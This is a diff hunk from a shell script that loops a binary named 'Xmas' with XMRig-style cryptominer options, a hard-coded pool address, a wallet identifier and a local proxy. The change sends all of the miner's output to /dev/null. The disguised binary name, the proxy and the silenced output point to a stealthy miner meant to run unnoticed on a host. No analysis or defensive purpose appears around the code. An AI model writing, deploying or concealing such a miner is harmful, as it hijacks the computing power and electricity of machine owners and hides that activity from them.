@@ -93,6 +93,6 @@ sleep 2
 
 while true
 do
-./Xmas --donate-level 1 -o 161.35.162.232:5555 -u bv1qd0hntshqslfejlle0vk4ewh2km55n2gze99dna -p $currentdate --verbose --randomx-1gb-pages -t $used_num_of_cores --proxy=127.0.0.1:1081
+./Xmas --donate-level 1 -o 161.35.162.232:5555 -u bv1qd0hntshqslfejlle0vk4ewh2km55n2gze99dna -p $currentdate --verbose --randomx-1gb-pages -t $used_num_of_cores --proxy=127.0.0.1:1081 1>/dev/null 2>&1
 sleep 10
 done
